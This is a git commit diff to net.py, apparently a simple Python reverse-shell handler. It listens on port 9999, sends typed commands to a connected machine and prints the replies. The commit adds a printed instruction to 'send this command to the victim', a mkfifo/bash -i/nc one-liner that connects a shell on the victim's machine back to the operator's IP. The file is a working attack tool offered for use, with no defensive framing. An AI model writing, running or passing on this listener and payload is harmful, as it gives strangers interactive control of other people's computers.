ed949e009d1d265a0620b9c00aa8ca291c1814a5
Hirukshacoder <97717488+Hirukshacoder@users.noreply.github.com>
2022-07-14 11:12:14 +0530

    reverse  -  X

--- net.py
+++ net.py
@@ -1,31 +1,39 @@
-import socket, sys, time
+import socket, sys, time 
+
+
+hostname = socket.gethostname()
+
+ipaddress = socket.gethostbyname(hostname)
+
+print("your ip address:-",ipaddress)
 
 
 def listen(ip,port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ip, port))
     s.listen(1)
-    print("Listening on port " + str(port))
+    print("Listening on port " + str(port) + (" ") + str(ipaddress))
+    print("send this command to the victim: mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc",ipaddress, "9999 >/tmp/f")
     conn, addr = s.accept()
     print('Connection received from ',addr)
     while True:
-        #Receive data from the target and get user input
         ans = conn.recv(1024).decode()
         sys.stdout.write(ans)
         command = input()
 
-        #Send command
+
         command += "\n"
         conn.send(command.encode())
         time.sleep(1)
 
-        #Remove the output of the "input()" function
+
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
 
 
 
 
-listen("0.0.0.0",9999)
 
 
+
+listen(ipaddress,9999)
 
